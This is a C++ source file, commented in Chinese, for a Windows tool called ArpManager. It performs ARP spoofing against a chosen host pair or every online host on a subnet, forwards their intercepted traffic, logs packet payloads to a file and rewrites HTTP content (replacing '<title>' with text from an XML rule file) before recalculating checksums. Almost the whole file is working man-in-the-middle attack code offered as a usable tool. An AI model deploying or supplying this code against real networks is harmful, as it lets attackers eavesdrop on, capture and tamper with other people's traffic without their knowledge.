// ArpManager.cpp: 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#include <Windows.h>

#include "getopt.h"
#include "pcap.h"
#include "iphlpapi.h"
#include "protoinfo.h"//结构体定义
#include "spoof.h"
#include "tcp.h"
#include "scan.h"
#include "replace.h"
#include "libxml\parser.h"
#include "libxml\tree.h"
#include "iconv.h"
#include "Filter.h"
#include "reform.h"
#include <zlib.h>
#include "ugzip.h"
#include "curl.h"
#include "transfer.h"

#pragma comment(lib, "Packet.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "libxml2.lib")
#pragma comment(lib, "iconv.lib")
#pragma comment(lib, "zlib.lib")
#pragma comment(lib, "libcurl.lib")

#define BUFFER_SIZE 256


//
// 存储要替换的字符串的链表结构
//

typedef struct tagSTRLINK
{
	char szOld[256];
	char szNew[256];
	struct tagSTRLINK *next;
}STRLINK, *PSTRLINK;

HANDLE hThread[2]; // 两个发送RARP包的线程
unsigned short g_uPort; // 要监视的端口号
pcap_t *adhandle; // 网卡句柄
pcap_t *adhandle1; // 网卡句柄
HANDLE g_hEvent; // 捕捉 Ctrl+C
int g_uMode; // 欺骗标志 0 表示单向欺骗， 1表示双向欺骗
BOOL bIsReplace = FALSE; // 是否对转发的数据进行替换
BOOL bIsLog = FALSE; // 是否进行数据保存
char szLogfile[MAX_PATH]; // 要保存数据的文件名
TCHAR modulePath[MAX_PATH] = {0};  //获取程序所在的路径
CHAR *g_node_name, *g_node_value;
extern CHAR* g_node_url;
extern BOOL g_direct;	//FLASE代表是客户端->服务器端，TRUE代表是服务器端->客户端
extern order *ord;

						  // 对应ARPSPOOF结构中的成员
unsigned char ucSelf[6], ucIPA[6], ucIPB[6];
char szIPSelf[16], szIPA[16], szIPB[16], szIPGate[16];
CRITICAL_SECTION g_cs;

// 初始化链表
PSTRLINK strLink = (PSTRLINK)malloc(sizeof(STRLINK));

char TcpFlag[6] = { 'F','S','R','P','A','U' }; //定义TCP标志位，分析数据包时用

BOOL InitSpoof(char **);
void ResetSpoof();
void Help();
xmlChar* ReadXmlFile(char* , char* );


//
// 帮助函数，对一些参数的说明和程序的使用
//

void Help()
{
	printf("Usage:\n");
	printf("  ArpManger <IP1> <IP2> <PORT> <AdpNum> <Mode> /[r|s] <File>\n");
	printf("  ArpManger /s <IP> <Mask>\n");
	printf("  ArpSManger /l\n");
	printf("\tMode Options:\n\t\t0\tIP1 --> IP2\n");
	printf("\t\t1\tIP1 <-> IP2\n");
	printf("Examples:\n");
	printf("\t> ArpManger 192.168.0.1 192.168.0.8 80 2 1 /r job.txt\n");
	printf("\t  # ArpManger 192.168.0.1 <-> 192.168.0.8:80 with rule\n\n");
	printf("\t> ArpManger 192.168.0.1 192.168.0.8 21 2 1 /s sniff.log\n");
	printf("\t  # ArpManger 192.168.0.1 <-> 192.168.0.8:80 save to log\n\n");
	printf("\t> ArpManger 192.168.0.1 192.168.0.8 80 2 0 /RESET\n");
	printf("\t  # Reset 192.168.0.1 --> 192.168.0.8:80\n\n");
	printf("\t> ArpManger /s 192.168.0.1 255.255.255.0\n");
	printf("\t  # Scan lan host\n\n");
	printf("\t> ArpManger /l\n");
	printf("\t  # Lists adapters\n\n");
	printf("\t> ArpManger /n\n");
	printf("\t  # Release a new replace rule file\n");
}

//
// 格式化copy函数，主要是为了替换 '\r', '\n'字符
//

BOOL fstrcpy(char *szSrc, char *szDst)
{
	unsigned int i, j;
	for (i = 0, j = 0; i < strlen(szSrc); i++, j++)
	{
		if (szSrc[i] == '\\' && szSrc[i + 1] == 'r') // Replace "\r"
		{
			szDst[j] = '\r';
			i++;
		}
		else if (szSrc[i] == '\\' && szSrc[i + 1] == 'n') // Replace "\n"
		{
			szDst[j] = '\n';
			i++;
		}
		else if (szSrc[i] != '\n' && szSrc[i] != '\0')
		{
			szDst[j] = szSrc[i];
		}
		else
		{
			return TRUE;
		}
	}
	szDst[j + 1] = '\0'; // add '\0'
	return TRUE;
}


//读取xml文件内容
xmlChar* ReadXmlFile(char* szFileName, char* node_content)
{
	xmlDocPtr doc;
	xmlNodePtr node;
	xmlKeepBlanksDefault(0);

	doc = xmlReadFile(szFileName, "UTF-8", XML_PARSE_RECOVER);
	if (NULL == doc)
	{
		printf("parser rule file is error....\n");
		return FALSE;
	}
	node = xmlDocGetRootElement(doc);
	if (NULL == doc)
	{
		printf("xml doc has no content....\n");
	}
	char str[256] = { 0 };
	node = node->children;
	while (node != NULL)
	{
		if (xmlStrcmp(node->name, (const xmlChar*)node_content) == 0)
		{
			return xmlNodeGetContent(node);
		}
		node = node->next;
	}
	xmlFreeDoc(doc);
	return NULL;
}

//
// 把数据写入文件
// 入口参数: szLogfile ==> 日志文件名 data ==> 指向数据块的空指针 size ==> 数据块大小
// 返回值类型 Boolean
//

BOOL SaveLog(char szLogfile[], const void *data, unsigned int size)
{
	HANDLE hFile;
	DWORD dwBytes;
	hFile = CreateFile(szLogfile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
		OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	SetFilePointer(hFile, NULL, NULL, FILE_END);
	WriteFile(hFile, data, size, &dwBytes, NULL);
	CloseHandle(hFile);
	return TRUE;
}

//
// 捕获控制台事件的函数,主要是处理程序中断事务
// 

BOOL CtrlHandler(DWORD fdwCtrlType)
{
	switch (fdwCtrlType)
	{
		// Handle the CTRL-C signal. 
	case CTRL_C_EVENT:
	case CTRL_CLOSE_EVENT:
	case CTRL_BREAK_EVENT:
	case CTRL_LOGOFF_EVENT:
	case CTRL_SHUTDOWN_EVENT:
		ResetSpoof(); //  恢复欺骗主机的arp cache
		return TRUE;
	default:
		return FALSE;
	}
}

// 
//  为公用变量赋值,初始化参数
//
BOOL InitSpoof(char* IpAddr, char* CheatAddr, char* uMode, char* uPort)
{
	// IPSelf, ucSelf 已经在打开网卡时初始化过了
	memset(ucIPA, 0xff, 6);
	memset(ucIPB, 0xff, 6);
	memset(szIPA, 0, 16);
	memset(szIPB, 0, 16);

	if (!GetMac((char *)IpAddr, ucIPA))
	{
		printf("[!] Error Get Mac Address of %s\n", IpAddr);
		return FALSE;
	}

	if (!GetMac((char *)CheatAddr, ucIPB))
	{
		printf("[!] Error Get Mac Address of %s\n", CheatAddr);
		return FALSE;
	}

	strcpy_s((char *)szIPA, sizeof(szIPA),(char *)IpAddr);
	strcpy_s((char *)szIPB, sizeof(szIPB), (char *)CheatAddr);
	StaticARP((unsigned char *)szIPA, ucIPA);//ARP表的初始化
	StaticARP((unsigned char *)szIPB, ucIPB);
	g_uPort = atoi(uPort);
	g_uMode = atoi(uMode);
	return TRUE;
}

//
// 显示ARP欺骗信息 (调试用)
// 加延迟是为了等待参数传递，因为函数公用一个ARPSPOOF变量
//

void SpoofInfo(PARPSPOOF arpspoof)
{

	printf("Spoof %s %s MAC %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",
		arpspoof->szTarget, arpspoof->szIP,
		arpspoof->ucPretendMAC[0], arpspoof->ucPretendMAC[1],
		arpspoof->ucPretendMAC[2], arpspoof->ucPretendMAC[3],
		arpspoof->ucPretendMAC[4], arpspoof->ucPretendMAC[5]
	);

	Sleep(1000);
}

//
// 处理ARP欺骗例程，开始Spoof
//
void ARPSpoof()
{
	PARPSPOOF arpspoof = (PARPSPOOF)malloc(sizeof(ARPSPOOF));
	arpspoof->adhandle = adhandle;//自己网卡的adhandle
	memcpy(arpspoof->ucSelfMAC, ucSelf, 6);


	// Spoof IP1 -> IP2
	strcpy((char *)arpspoof->szTarget, szIPA);
	memcpy(arpspoof->ucTargetMAC, ucIPA, 6);
	strcpy((char *)arpspoof->szIP, szIPB);
	memcpy(arpspoof->ucIPMAC, ucIPB, 6);
	memcpy(arpspoof->ucPretendMAC, ucSelf, 6);//欺骗的mac地址
	hThread[0] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SpoofThread,
		(LPVOID)arpspoof, NULL, NULL);
	SpoofInfo(arpspoof);

	if (g_uMode == 1) // 如果双向欺骗
	{
		// Spoof IP2 -> IP1
		strcpy((char *)arpspoof->szTarget, szIPB);
		memcpy(arpspoof->ucTargetMAC, ucIPB, 6);
		strcpy((char *)arpspoof->szIP, szIPA);
		memcpy(arpspoof->ucIPMAC, ucIPA, 6);
		memcpy(arpspoof->ucPretendMAC, ucSelf, 6);
		hThread[1] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SpoofThread,
			(LPVOID)arpspoof, NULL, NULL);
		SpoofInfo(arpspoof);
	}

	CloseHandle(hThread[0]);
	CloseHandle(hThread[1]);


}


//
// 重置ARP欺骗，恢复受骗主机的ARP cache
//     和ARPSpoof做相反操作
//
void ResetSpoof()
{
	printf("[+] Reseting .....\n");

	TerminateThread(hThread[0], 0);
	TerminateThread(hThread[1], 0);

	PARPSPOOF arpspoof = (PARPSPOOF)malloc(sizeof(ARPSPOOF));

	arpspoof->adhandle = adhandle;
	strcpy((char *)arpspoof->szTarget, szIPA);
	memcpy(arpspoof->ucTargetMAC, ucIPA, 6);
	strcpy((char *)arpspoof->szIP, szIPB);
	memcpy(arpspoof->ucIPMAC, ucIPB, 6);
	memcpy(arpspoof->ucPretendMAC, ucIPB, 6);
	memcpy(arpspoof->ucSelfMAC, ucSelf, 6);
	hThread[0] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SpoofThread,
		(LPVOID)arpspoof, NULL, NULL);
	if (g_uMode == 1)
	{
		Sleep(200);
		strcpy((char *)arpspoof->szTarget, szIPB);
		memcpy(arpspoof->ucTargetMAC, ucIPB, 6);
		strcpy((char *)arpspoof->szIP, szIPA);
		memcpy(arpspoof->ucIPMAC, ucIPA, 6);
		memcpy(arpspoof->ucPretendMAC, ucIPA, 6);
		hThread[1] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SpoofThread,
			(LPVOID)arpspoof, NULL, NULL);
	}

	printf("[-] Sleep 5s ");
	for (int i = 0; i < 12; i++, Sleep(300))
		printf(".");
	printf("\n");
	TerminateThread(hThread[0], 0);
	TerminateThread(hThread[1], 0);

	// pcap_breakloop后，所有对网卡的操作都会使用程序中止，切记
	pcap_breakloop(adhandle);
}

//
// 替换数据包中内容, 重新计算校验和
//
void ReplacePacket(const u_char *pkt_data, unsigned int pkt_len)
{
	ETHeader *eh;
	IPHeader *ih;
	TCPHeader *th;
	UDPHeader *uh;
	u_int ip_len;
	unsigned char *datatcp;
	eh = (ETHeader *)pkt_data;
	ih = (IPHeader *)(pkt_data + 14);
	ip_len = (ih->iphVerLen & 0xf) * 4;
	int lentcp;
	char* compressed = NULL;

	if (ih->ipProtocol == PROTO_TCP)
	{
		th = (TCPHeader *)((u_char*)ih + ip_len);

		// 得到TCP数据包的指针和长度
		datatcp = (unsigned char *)ih + sizeof(_IPHeader)
			+ sizeof(struct _TCPHeader);
		lentcp = ntohs(ih->ipLength) - (sizeof(_IPHeader) + sizeof(_TCPHeader));
		//printf("%d,%d,%d\n", ntohs(ih->ipLength), sizeof(_IPHeader), sizeof(_TCPHeader));
		//printf("%d\n", lentcp);
		int j = 0;
		//while (j < lentcp)
		//{
		//	printf("%c", datatcp[j]);
		//	j++;
		//}


		// 开始替换数据内容,重新计算校验和
		PSTRLINK pTmp = strLink;
		int i = 0;
		if (pTmp)
		{
			//if ((compressed = (char*)malloc(lentcp * 2)))
			//{
				//memset(compressed, 0, lentcp * 2);
				//解压Gzip内容
				//if (gzDecompress((char*)datatcp, lentcp, compressed, lentcp * 2))
				//{
				//	printf("解码gzip内容成功\n");
				//	printf("uncompressed: %s\n", compressed);
					//system("pause");
				//}
			//}
			//替换内容
			if (Replace(datatcp, lentcp, pTmp->szOld, pTmp->szNew))
			{
				//printf("    Applying rul %s ==> %s\n", pTmp->szOld, pTmp->szNew);
				i++;
			}
		}
		if (i > 0) // 如果数据包被修改，重新计算校验和
		{
			printf("[*] Done %d replacements, forwarding packet of size %d\n",
				i, pkt_len);
			ih->ipChecksum = 0;

			ih->ipChecksum = checksum((USHORT *)ih, sizeof(_IPHeader));
			unsigned int q = 0;


			if (ih->ipProtocol == PROTO_TCP)
			{
				th->checksum = 0;
				ComputeTcpPseudoHeaderChecksum(ih, th, (char *)datatcp, lentcp);
			}
			if (ih->ipProtocol == PROTO_UDP)
			{
				uh->checksum = 0;
				ComputeUdpPseudoHeaderChecksum(ih, uh, (char *)datatcp, lentcp);
			}
		}
		else
		{
			//printf("[*] Forwarding untouched packet of size %d\n", pkt_len);
		}
	}
}

//
// 分析显示数据包内容，或者保存至文件
// pkt_len截获数据包总长度

void AnalyzePacket(const u_char *pkt_data, unsigned int pkt_len)  
{
	ETHeader *eh;
	IPHeader *ih;
	TCPHeader *th;
	UDPHeader *uh;
	u_int ip_len;
	char szSource[16], szDest[16];
	u_short sport, dport;
	eh = (ETHeader *)pkt_data;
	ih = (IPHeader *)(pkt_data + 14);
	ip_len = (ih->iphVerLen & 0xf) * 4;       //ip头长度，版本号和头长度
	ULONG sequenceNumber;
	ULONG acknowledgeNumber;

	if (ih->ipProtocol == PROTO_TCP)
	{
		th = (TCPHeader *)((u_char*)ih + ip_len);

		sport = ntohs(th->sourcePort);
		dport = ntohs(th->destinationPort);


		sequenceNumber = ntohl(th->sequenceNumber);
		acknowledgeNumber = ntohl(th->acknowledgeNumber);

		unsigned char *datatcp = (unsigned char *)ih + sizeof(_IPHeader)
			+ sizeof(struct _TCPHeader);
		int lentcp = ntohs(ih->ipLength) - (sizeof(_IPHeader) + sizeof(_TCPHeader));


		wsprintf(szSource, "%d.%d.%d.%d",
			ih->ipSourceByte.byte1, ih->ipSourceByte.byte2,
			ih->ipSourceByte.byte3, ih->ipSourceByte.byte4);

		wsprintf(szDest, "%d.%d.%d.%d",
			ih->ipDestinationByte.byte1, ih->ipDestinationByte.byte2,
			ih->ipDestinationByte.byte3, ih->ipDestinationByte.byte4);

		printf("%s-%s", szSource, szDest);
		// 分析数据包
		char szTmpStr[85], szTmpFlag[7];
		szTmpFlag[6] = '\0';

		unsigned char FlagMask = 1;
		for (int i = 0; i<6; i++)
		{
			if ((th->flags) & FlagMask)
				szTmpFlag[i] = TcpFlag[i];
			else
				szTmpFlag[i] = '-';
			FlagMask = FlagMask << 1;
		}
		wsprintf(szTmpStr,
			"\nTCP %15s->%-15s Bytes=%-4d  TTL=%-3d Port:%d->%d  %s\n",
			szSource, szDest, lentcp, ih->ipTTL, sport, dport, szTmpFlag);
		//printf("%s", szTmpStr);

		printf("TCP packet sequenceNumber %ld\n", ntohl(sequenceNumber));
		//建立双链表
		/*
		if (ord)
		{
			g_direct = TRUE;
			TcpOrder(ord, pkt_data, pkt_len);		//插入新元素
		}
		else
		{
			ReformHttpPacket(pkt_data, pkt_len);
		}
		*/
		if (bIsLog) // 写入文件
		{
			SaveLog(szLogfile, szTmpStr, strlen(szTmpStr));
			SaveLog(szLogfile, "-------", 7);
			SaveLog(szLogfile, datatcp, lentcp);
		}

		//  显示数据包的内容
		/*
		for (int j = 0; j < lentcp; j++)
		{
			if ((*(datatcp + j) & 0x000000ff) != 0x07)  // 过滤掉可恶的Beep字符
				printf("%c", *(datatcp + j));
		}
		*/
	}

	if (ih->ipProtocol == PROTO_UDP)
	{
		uh = (UDPHeader *)((u_char*)ih + ip_len);

		sport = ntohs(uh->sourcePort);
		dport = ntohs(uh->destinationPort);

		unsigned char *datatcp = (unsigned char *)ih + sizeof(_IPHeader)
			+ sizeof(struct _UDPHeader);
		int lentcp = ntohs(ih->ipLength) - (sizeof(_IPHeader) + sizeof(_UDPHeader));

		wsprintf(szSource, "%d.%d.%d.%d",
			ih->ipSourceByte.byte1, ih->ipSourceByte.byte2,
			ih->ipSourceByte.byte3, ih->ipSourceByte.byte4);

		wsprintf(szDest, "%d.%d.%d.%d",
			ih->ipDestinationByte.byte1, ih->ipDestinationByte.byte2,
			ih->ipDestinationByte.byte3, ih->ipDestinationByte.byte4);

		printf("%s-%s", szSource, szDest);
		// 分析数据包
		char szTmpStr[72];
		wsprintf(szTmpStr,
			"\nUDP %15s->%-15s Bytes=%-4d Port:%d->%d \n",
			szSource, szDest, lentcp, sport, dport);
		printf("%s", szTmpStr);
		if (bIsLog) // 写入文件
		{
			SaveLog(szLogfile, szTmpStr, strlen(szTmpStr));
			SaveLog(szLogfile, "-------", 7);
			SaveLog(szLogfile, datatcp, lentcp);
		}

		//  显示数据包的内容
		for (int j = 0; j< lentcp; j++)
		{
			if ((*(datatcp + j) & 0x000000ff) != 0x07)  // 过滤掉可恶的Beep字符
				printf("%c", *(datatcp + j));
		}


	}


}

//
//  处理转发、修改、保存数据包的例程
//  程序的核心部分
//
void ForwardPacket(pcap_t *adhandle, const u_char *pkt_data, unsigned int pkt_len)
{
	ETHeader *eh;
	IPHeader *ih;
	TCPHeader *th;
	UDPHeader *uh;
	u_int ip_len;
	char szSource[16], szDest[16];
	u_short sport, dport;
	BOOL HttpFlag;

	eh = (ETHeader *)pkt_data;

	if (eh->type != htons(ETHERTYPE_IP))
		return; // 只转发IP包

	ih = (IPHeader *)(pkt_data + 14); //找到IP头的位置,14为以太头的长度
	ip_len = (ih->iphVerLen & 0xf) * 4;
	if (ih->ipProtocol == PROTO_TCP)
	{
		th = (TCPHeader *)((u_char*)ih + ip_len); // 找到TCP的位置

												  // 将端口信息从网络型转变为主机顺序
		sport = ntohs(th->sourcePort);
		dport = ntohs(th->destinationPort);
	}
	if (ih->ipProtocol == PROTO_UDP)
	{
		uh = (UDPHeader *)((u_char*)ih + ip_len); // 找到UDP的位置

												  // 将端口信息从网络型转变为主机顺序
		sport = ntohs(uh->sourcePort);
		dport = ntohs(uh->destinationPort);
	}

	// 得到源IP地址，目标IP地址
	wsprintf(szSource, "%d.%d.%d.%d",
		ih->ipSourceByte.byte1, ih->ipSourceByte.byte2,
		ih->ipSourceByte.byte3, ih->ipSourceByte.byte4);

	wsprintf(szDest, "%d.%d.%d.%d",
		ih->ipDestinationByte.byte1, ih->ipDestinationByte.byte2,
		ih->ipDestinationByte.byte3, ih->ipDestinationByte.byte4);
	printf("%s:%d->%s:%d\n", szSource, sport, szDest, dport);
	printf("%.2x-%.2x-%.2x-%.2x-%.2x-%.2x->", eh->shost[0], eh->shost[1], eh->shost[2], eh->shost[3], eh->shost[4], eh->shost[5], eh->shost[6]);
	printf("%.2x-%.2x-%.2x-%.2x-%.2x-%.2x\n", eh->dhost[0], eh->dhost[1], eh->dhost[2], eh->dhost[3], eh->dhost[4], eh->dhost[5], eh->dhost[6]);

	//过滤和判断HTTP数据包

	//if (FilterHttpPacket(pkt_data, pkt_len))
	//{
		//printf("TCP Packet is http ,start forward the TCP......\n");
		//system("pause");
	//}

	//测试使用
	//if (ReformHttpPacket(pkt_data, pkt_len))
	//{
	//	system("pause");
	//}


	// 开始过滤要转发的数据包
	if (strcmp(szDest, szIPSelf) != 0 && memcmp(ucSelf, eh->dhost, 6) == 0)
	{
		// rebuild IPA -> IPB
		if (memcmp(eh->shost, ucIPA, 6) == 0)
		{
			// 修改以太网头
			memcpy(eh->shost, eh->dhost, 6);//将本机的mac地址付给源mac地址
			memcpy(eh->dhost, ucIPB, 6);//ucIPA，ucIPB都是mac地址

			printf("%d\n", dport);
			printf("%d\n", g_uPort);

			if (sport == g_uPort)
			{//ih->ipProtocol == PROTO_TCP
				if (bIsReplace) // 是否替换
				{
					printf("[+] Caught %15s:%-4d -> %s:%d\n", szSource, sport, szDest, dport);
					AnalyzePacket(pkt_data, pkt_len);
					ReplacePacket(pkt_data, pkt_len);
					printf("[*] Forwarding untouched packet of size %d\n", pkt_len);
				}
				else
				{
					printf("analyze---------------------\n");
					AnalyzePacket(pkt_data, pkt_len);
				}
			}
			if (pcap_sendpacket(adhandle, (const unsigned char *)pkt_data, pkt_len) < 0)
			{

				printf("[!] Forward thread send packet error\n");
			}

		}

		// rebuild IPB -> IPA
		if (memcmp(eh->shost, ucIPB, 6) == 0)
		{
			memcpy(eh->shost, eh->dhost, 6);
			memcpy(eh->dhost, ucIPA, 6);

			if (dport == g_uPort)
			{
				if (bIsReplace)
				{
					printf("[+] Caught %15s:%-4d -------> %s:%d\n", szSource, sport, szDest, dport);
					AnalyzePacket(pkt_data, pkt_len);
					ReplacePacket(pkt_data, pkt_len);
				}
				else
				{
					AnalyzePacket(pkt_data, pkt_len);
				}
			}
			if (pcap_sendpacket(adhandle, (const unsigned char *)pkt_data, pkt_len) < 0)
			{
				printf("[!] Forward thread send packet error\n");
			}

		}
	}
}

//
// pcap_loop的回调函数
// 把接收到的数据传给ForwardPacket函数处理
//
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)
{
	printf("recv data to ForwardPacket-----------\n");
	ForwardPacket(adhandle, pkt_data, header->len);
}



//
// 主函数，主要处理参数的初始化
//
int __cdecl main(int argc, char *argv[])
{
	/*
	argc = 8;
	argv[1] = "192.168.20.50";
	argv[2] = "192.168.20.124";
	argv[3] = "80";
	argv[4] = "2";
	argv[5] = "0";
	argv[6] = "/s";
	argv[7] = "sniff.log";
	*/
	int c = EOF;
	BOOL EnumHost = FALSE;
	BOOL EnumHostOne = FALSE;
	BOOL EnumMask = FALSE;
	BOOL Ethernet = FALSE;
	BOOL reset = FALSE;
	BOOL Replace = FALSE;
	BOOL LogFlag = FALSE;
	char IpAddr[BUFFER_SIZE] = { 0 };
	char NetMask[BUFFER_SIZE] = { 0 };
	char Controll[BUFFER_SIZE] = { 0 };
	char CheatAddr[BUFFER_SIZE] = { 0 };
	char uMode[BUFFER_SIZE] = { 0 };
	char uPort[BUFFER_SIZE] = { 0 };
	char ReplaceFile1[BUFFER_SIZE] = { 0 };
	char LogFile[BUFFER_SIZE] = { 0 };
	PLAN_HOST_INFO lan_host_header;
	PSTRLINK pTmp = NULL;				//保持链表头部
	char content[] = "<title>";

	if (argc < 2) // 参数不正确，显示使用帮助
	{
		Help();
		return 0;
	}

	//参数解析
	while ((c = getopt(argc, argv, "i:t:p:m:n:s:lr:F:w:r:")) != EOF)
	{
		switch (c)
		{
		case 'l':						// 列出可用的网卡
			ListAdapters();
			return 0;
		case 'n':
			strcpy_s(NetMask, BUFFER_SIZE, optarg); //获取掩码地址
			EnumMask = TRUE;
			break;
		case 'i':
			strcpy_s(IpAddr, BUFFER_SIZE, optarg);   //获取IP地址
			EnumHost = TRUE;
			break;
		case 'F':
			printf("[+] Replace Job file job.txt release success...\n");
			break;
		case 'w':
			strcpy_s(Controll, BUFFER_SIZE, optarg); //获取要绑定网卡的编号
			Ethernet = TRUE;
			break;
		case 't':
			strcpy_s(CheatAddr, BUFFER_SIZE, optarg);   //获取要欺骗的IP地址
			EnumHostOne = TRUE;
			break;
		case 'p':
			strcpy_s(uPort, BUFFER_SIZE, optarg); //获取http端口信息
			g_uPort = atoi(uPort);
			break;
		case 'm':
			strcpy_s(uMode, BUFFER_SIZE, optarg); //获取模式信息，是单向欺骗还是双向欺骗
			g_uMode = 1;
			if (g_uMode == 1) //  双向欺骗
				printf("[*] Spoofing  %s <-> %s\n", szIPA, szIPB);
			else // 单向欺骗
				printf("[*] Spoofing  %s --> %s\n", szIPA, szIPB);
			break;
		case 'r':
			Replace = TRUE;
			bIsReplace = TRUE;
			if (!bIsReplace) // 只转发，不替换
			{
				printf("[+] Using fixed forwarding thread.\n");
			}
			strcpy_s(ReplaceFile1, BUFFER_SIZE, optarg); //获取规则文件

			GetModuleFileName(NULL, modulePath, _MAX_PATH); //获取应用程序所在的路径
			*(strrchr(modulePath, '\\') + 1) = 0;
			printf("%s", modulePath);
			
			strcat(modulePath, ReplaceFile1);				    //连接文件名
			g_node_name = (char*)ReadXmlFile(modulePath, "name");        //解析规则文件
			g_node_value = (char*)ReadXmlFile(modulePath, "value");
			g_node_url = (char*)ReadXmlFile(modulePath, "url");


			strLink = (PSTRLINK)malloc(sizeof(STRLINK));
			//建立替换内容的链表
			pTmp = strLink;
			memset(strLink->szOld, 0, sizeof(strLink->szOld));
			memset(strLink->szNew, 0, sizeof(strLink->szNew));
			memcpy(strLink->szOld, content, strlen(content));
			memcpy(strLink->szNew, g_node_value, strlen(g_node_value));
			strLink->next = NULL;
			break;
		case 's':
			strcpy_s(LogFile, BUFFER_SIZE, optarg);
			LogFlag = TRUE;
			//将http内容保存到log文件中
			if (TRUE == LogFlag) //  是否保存数据到文件
			{
				strcpy_s(szLogfile, sizeof(LogFile), LogFile);
				bIsLog = TRUE;
				printf("[+] Save log to %s\n", szLogfile);
			}
			break;
		default:
			break;
		}
	}

	if ((TRUE == EnumMask)&&(TRUE == EnumHost))
	{
		printf("%d %d", EnumMask, EnumHost);
		lan_host_header = EnumLanHost(IpAddr, NetMask);	//获取局域网段内所有主机的信息
	}

	if (Ethernet)
	{
		// 打开网卡，初始化szIPSelf, ucSelf, szIPGate变量
		//Controll表示绑定本机的第几个网卡
		if ((adhandle = OpenAdapter(atoi(Controll), szIPSelf, ucSelf, szIPGate)) == NULL)
		{
			printf("[!] Open adatper error!\n");
			return FALSE;
		}

		InitializeCriticalSection(&g_cs);

		if (EnumHostOne == TRUE)
		{
			if (InitSpoof(IpAddr, CheatAddr, uMode, uPort))//InitSpoof初始化
			{
				// 开始主要例程，欺骗并转发处理数据包
				ARPSpoof();
			}
		}
		else
		{
			for (int i = 0; lan_host_header != NULL; )
			{

				if (lan_host_header->bIsOnline)
				{
					//排除自身的IP地址
					//IpAddr= argv[2] CheatAddr = argv[3] ,Controll = argv[4], uMode = argv[5]  uPort = argv[3]
					if ((memcmp(lan_host_header->IpAddr, szIPSelf, sizeof(szIPSelf))) == 0 ||
						(memcmp(lan_host_header->IpAddr, szIPGate, sizeof(szIPSelf))) == 0)
					{
						lan_host_header = lan_host_header->next;
						continue;
					}

					// 初始化其它变量，转入核心例程

					if (InitSpoof(IpAddr, lan_host_header->IpAddr, uMode, uPort))
					{
						
						printf(" Initialize lan IP %s is successful...\n", lan_host_header->IpAddr);
						ARPSpoof();
					}
					else
					{
						printf(" Initialize lan IP %s is failure...\n", lan_host_header->IpAddr);

					}
				}
				lan_host_header = lan_host_header->next;
			}
		}

		//设置ctrl中断
		SetConsoleCtrlHandler((PHANDLER_ROUTINE)CtrlHandler, TRUE);

		// 初始化其它变量，转入核心例程
		//IpAddr= argv[2] CheatAddr = argv[3] ,Controll = argv[4], uMode = argv[5]  uPort = argv[3]

		pcap_loop(adhandle, 0, packet_handler, NULL);
		pcap_close(adhandle);
	}

	return 0;

}

